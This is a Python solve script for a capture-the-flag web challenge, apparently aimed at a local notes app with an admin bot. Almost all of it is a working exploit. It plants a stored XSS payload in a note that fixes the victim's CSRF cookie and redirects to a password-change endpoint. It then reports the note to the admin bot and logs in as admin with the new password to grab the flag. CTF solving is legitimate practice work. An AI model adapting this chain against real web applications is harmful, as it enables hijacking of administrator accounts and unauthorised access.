import requests, sys, re, time

APP = "http://app.ctf.local"
API = "http://api.ctf.local"
BOT = "http://localhost:8888"

ATTACKER = "pwner1337"
ATTACKER_PASS = "hunter2"

def main():
    s = requests.Session()

    print("[+] registering attacker account")
    r = s.post(APP + "/register", data={"username": ATTACKER, "password": ATTACKER_PASS})
    if "username taken" in r.text:
        r = s.post(APP + "/login", data={"username": ATTACKER, "password": ATTACKER_PASS})

    csrf_token = s.cookies.get("csrf_token")
    print("[+] got csrf token:", csrf_token)

    # create exploit note
    exploit = f"""<img src="{API}/cookie/set?name=csrf_token&value={csrf_token}">
<script>
setTimeout(function() {{
  window.location = "{APP}/change-password?password=pwned123&csrf_token={csrf_token}";
}}, 1500);
</script>"""

    print("[+] creating exploit note")
    r = s.post(APP + "/create", data={
        "title": "check this out",
        "content": exploit
    })

    m = re.search(r'/notes/(\d+)', s.get(APP + "/dashboard").text)
    if not m:
        print("[-] could not find note id")
        sys.exit(1)
    note_id = m.group(1)
    exploit_url = f"{APP}/notes/{note_id}"
    print("[+] exploit note at:", exploit_url)

    # send to bot
    print("[+] sending to admin bot")
    r = requests.post(BOT + "/report", data={"url": exploit_url})
    print("[+] bot:", r.text.strip())

    time.sleep(5)
    print("[+] logging in as admin with new password")
    s2 = requests.Session()
    r = s2.post(APP + "/login", data={"username": "admin", "password": "pwned123"})
    if "wrong" in r.text:
        print("[-] login failed, attack might not have worked")
        sys.exit(1)

    print("[+] flag:", s2.get(APP + "/flag", params={"password": "pwned123"}).text.strip())

if __name__ == "__main__":
    main()
